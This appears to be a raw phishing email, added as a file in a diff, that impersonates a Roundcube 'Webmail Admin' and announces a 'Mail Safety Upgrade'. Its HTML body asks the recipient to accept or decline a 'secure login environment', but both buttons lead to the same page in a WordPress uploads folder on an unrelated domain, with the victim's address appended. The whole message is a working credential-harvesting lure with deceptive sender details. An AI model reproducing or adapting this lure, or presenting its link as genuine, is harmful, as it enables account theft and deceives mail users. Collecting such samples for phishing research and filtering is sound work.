@@ -1,0 +1,126 @@
+Return-Path: accounts@apacinvoicehuntsnan.com
+Delivered-To: jose@monkey.org
+X-FDA: 84043721412.18.DE740B5
+Received: from mail.apacinvoicehuntsnan.com (mail.apacinvoicehuntsnan.com
+ [152.114.194.151])
+	by imf19.b.hostedemail.com (Postfix) with ESMTP id EF8B740005
+	for <jose@monkey.org>; Mon, 27 Oct 2025 11:48:24 +0000 (UTC)
+Authentication-Results: imf19.b.hostedemail.com;
+	dkim=pass header.d=apacinvoicehuntsnan.com header.s=default
+ header.b=BpviIKVG;
+	spf=pass (imf19.b.hostedemail.com: domain of accounts@apacinvoicehuntsnan.com
+ designates 152.114.194.151 as permitted sender)
+ smtp.mailfrom=accounts@apacinvoicehuntsnan.com;
+	dmarc=pass (policy=none) header.from=apacinvoicehuntsnan.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1761565705;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=HzgKg7s++tqgPn8KOVClonkr3ENls/cylVWn8g7hvdE=;
+	b=6fT/dPPCVJ3wqwssze7rThSChEgT5w82aidY/TXB/7n8Xk/P/ec53FaC2WumUWCQew3Frn
+	TpiQ0F/LD/Z8an1EEToQ60QQ+rm94Ym62uvzXj2hrdwa/UsuH6HdGxYOmzhh0BnVmTLyoH
+	Vul28O/XxwRATDkF9WNwVvN6RBSIVs4=
+ARC-Authentication-Results: i=1;
+	imf19.b.hostedemail.com;
+	dkim=pass header.d=apacinvoicehuntsnan.com header.s=default
+ header.b=BpviIKVG;
+	spf=pass (imf19.b.hostedemail.com: domain of accounts@apacinvoicehuntsnan.com
+ designates 152.114.194.151 as permitted sender)
+ smtp.mailfrom=accounts@apacinvoicehuntsnan.com;
+	dmarc=pass (policy=none) header.from=apacinvoicehuntsnan.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1761565705; a=rsa-sha256;
+	cv=none;
+	b=3Wf1wrn0KigqTFKVM+pgTOjsDBMAkwVi/miAZ7LVOyBQMe3bnLBwBAjzYw8JsN6XRSzQJx
+	EoJmpkeRQituytAO2HTXx3Y6PApUABTM+tlkPEyq+NU1OuQM34Tkdg7ixEBI1MX+sbHW6b
+	U7EKq2o2dPapLhuLSuTMo+J0cFK4G2I=
+Received: from apacinvoicehuntsnan.com (unknown [31.57.219.4])
+	by mail.apacinvoicehuntsnan.com (Postfix) with ESMTPA id 218C5260769
+	for <jose@monkey.org>; Mon, 27 Oct 2025 12:48:13 +0100 (CET)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+	d=apacinvoicehuntsnan.com; s=default; t=1761565693;
+	bh=HzgKg7s++tqgPn8KOVClonkr3ENls/cylVWn8g7hvdE=;
+	h=From:To:Subject:Date;
+	b=BpviIKVG8dheYISM8BWWKYi1EJA1VRQbvjc/h6ZZ2U3HrnjNZfhdksP2SDvh1hwWu
+	 0CBlj4T/taVlJjAlWWmeeo6PzeoYmmG3bzNKr51vSLCLVHnAyw/iKJpDT9huTnc2Am
+	 xkF1f+GWffWsgRUR/DatA1jd3h4iej40ptZUqyPw=
+From: Webmail Admin  <accounts@apacinvoicehuntsnan.com>
+To: jose@monkey.org
+Subject: Mail Safety Upgrade Completed
+Date: 27 Oct 2025 04:48:11 -0700
+Message-ID: <20251027044811.2D1B5EB50A971489@apacinvoicehuntsnan.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Stat-Signature: mweweqece3pts3taqp4pwuso1swhekq5
+X-Rspam-User: 
+X-Rspamd-Queue-Id: EF8B740005
+X-Rspamd-Server: rspam06
+X-Spam-Status: No, score=0.30
+X-HE-Tag: 1761565704-930661
+X-HE-Meta: 
+ U2FsdGVkX1+BeXEnUo0hsX2hyHbY8FN2xTXs2iLnMJ3dSaDbLKFxHnQKoxTdJkcspX8xCMEpEXovylwBnAmYhq1ocOUh+NL64Cbj/WOXEjeHlpa7BI9FaPMcYisO8tOwpItp2dyeqixpLhBSbuDw0vCSvm0gTooAGlia26NZrWctu4j/BI4o790ECvcsfULCSmQO+LFMrEEHvC9LrJsnISas/euC/G6WvYtKx9+ZyxxmSB/DW4rrGTXQ2OwCpO32Csz/kiIkUg1U8hEg+gg87/GyOjgT/TFQ1rVKgly119ZDBKgjdqxBwu9kSHuZIpKrKR6WiMs90IW2peTk1iTbcwOjVEdt9bIV+LjimWYLIf04o4PbVkEauphctmiMQ9dJmmjE3enLyO5kiMylPnbs5epGIKZEjm3lTRvSepy+H8ILVc54gUrLBEkQS/4hRdQdOO/322YX2h1s5cuVBr6ol20velss/jVpDwjfXhaAuC1JKCtkA/BjppUq159qcmNCnXu63RR55WJtfAcdzz0BsM73IQfd2kOITSA3gbeOaZF7w0tT/u+9vPaJI07z7AFVA6xYCbh3T8tddZDzK1Pcr9lvVeywgKHdfnGdppDjPyGTA5wHp49VRe0dbpb6rwMcGYfoyFdIvkwOqYCUoHMkBH+S5F+BzD2XaVgSKugUL7AGhPy2qsB8KMGDIWRl4koBEtDteAvBBzOocMpVUnAkm1uecImKwkMA7eqORGjKB8e40e0+C6As6H0Z/XYO4RtMQUPl2c6tIW/+W24laOmSgLFjCPIMBfD1Dwf+9C2PUt9GIPoiYuWRxXAyuM5pkZd/KN3A7gZwXBafbYvyEJlgSp2auCj2tl/IMScn7PDg3Ctz1mS3BMDK0OUu4Z9MNiArD1XjWz0it1dwKJEakcHWQ+JOYlCRupYrFGWbARVhkvURxhGDsyPpkRISbBxd4EHmBEHE/5cEw+ZmjTJ2Xx0xzNEZNTh
+ YLi+kbWIVoeg476NtbloL7WPYPNE2K+gITxM6PKvOQdpOOiRuLgG3f1b8vOoUBzVzh6g2T92LPjaYk0G9o/s+M7bnOjmGpgs1WNCd80z2qHw4FIeSVYG/384MMhh9RfTPBtpGwLpiqiCa3x8ZFG+wHyqCJq6cYuygO5tcj+UaD8wpL9aDpweB5f+psyV0MqZ+XJMxCHgQ3As0fByd5Y0G1JgCmUfOq+AJ7uoR64gS2aocofiknxiIgn0KA+Mk8vBjOPhFl0Dir1dVgeI=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 417
+
+<!DOCTYPE html>
+
+<HTML><HEAD><TITLE>Customer Server Message</TITLE>
+<META charset=3DUTF-8>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body style=3D"FONT-FAMILY: Arial, sans-serif; COLOR: #333333; BACKGROUND-C=
+OLOR: #f9f9f9">
+<DIV style=3D"MAX-WIDTH: 600px; BORDER-TOP: #dddddd 1px solid; BORDER-RIGHT=
+: #dddddd 1px solid; BORDER-BOTTOM: #dddddd 1px solid; PADDING-BOTTOM: 20px=
+; PADDING-TOP: 20px; PADDING-LEFT: 20px; MARGIN: 20px auto; BORDER-LEFT: #d=
+ddddd 1px solid; PADDING-RIGHT: 20px; BACKGROUND-COLOR: #ffffff; border-rad=
+ius: 5px">
+<DIV style=3D"COLOR: #ffffff; PADDING-BOTTOM: 10px; TEXT-ALIGN: left; PADDI=
+NG-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px; BACKGROUND-COLOR: #0=
+03399; border-radius: 5px">
+<H1 style=3D"FONT-SIZE: 24px; MARGIN: 0px; DISPLAY: inline-block">Roundcube=
+</H1>
+<P style=3D"FONT-SIZE: 16px; FLOAT: right; MARGIN: 0px">Customer Server Mes=
+sage</P>
+<DIV style=3D"CLEAR: both"></DIV></DIV>
+<DIV style=3D"MARGIN-TOP: 20px">
+<P>Dear jose@monkey.org</P>
+<P>To enhance the safety of your account, we are setting up a secure login =
+environment that helps protect you from unauthorized access.</P>
+<P>Please review and confirm your current login location to complete this s=
+etup.</P>
+<P>&#9989; Accept - Confirm this device, IP address, and current geo locati=
+on as your trusted login environment.</P>
+<P>&#10060; Decline - Do not confirm this location. Your account will remai=
+n protected, and login from this location may require additional verificati=
+on.</P>
+<P>Benefits of a Secure Login Environment:</P>
+<UL>
+<LI>Prevents unauthorized access from unregistered or unconfirmed locations=
+ or internet servers.=20
+<LI>Ensures your account can only be accessed from approved and trusted loc=
+ations.=20
+<LI>Monitors and safeguards your confirmed login environment against extern=
+al attacks or suspicious activity.=20
+<LI>Keeps your personal information and account details secure at all times=
+=2E </LI></UL>
+<P>Please click Accept or Decline to proceed.</P></DIV>
+<DIV style=3D"TEXT-ALIGN: center; MARGIN-TOP: 20px"><A style=3D"TEXT-DECORA=
+TION: none; COLOR: #ffffff; PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDIN=
+G-LEFT: 24px; DISPLAY: inline-block; PADDING-RIGHT: 24px; BACKGROUND-COLOR:=
+ green; MARGIN-RIGHT: 10px; border-radius: 5px" href=3D"https://wordpress-j=
+s04gwg0ko8ogogsc00kkko0.wagnerlakes.com/wp-content/uploads/redintone/index.=
+html#jose@monkey.org">Accept</A>
+ <A style=3D"TEXT-DECORATION: none; COLOR: #ffffff; PADDING-BOTTOM: 12px; P=
+ADDING-TOP: 12px; PADDING-LEFT: 24px; DISPLAY: inline-block; PADDING-RIGHT:=
+ 24px; BACKGROUND-COLOR: red; border-radius: 5px" href=3D"https://wordpress=
+-js04gwg0ko8ogogsc00kkko0.wagnerlakes.com/wp-content/uploads/redintone/inde=
+x.html#jose@monkey.org">Decline</A> <BR><BR>&#65533; 2025 jose@monkey.org A=
+ll Rights Reserved</DIV></DIV></BODY></HTML>
+
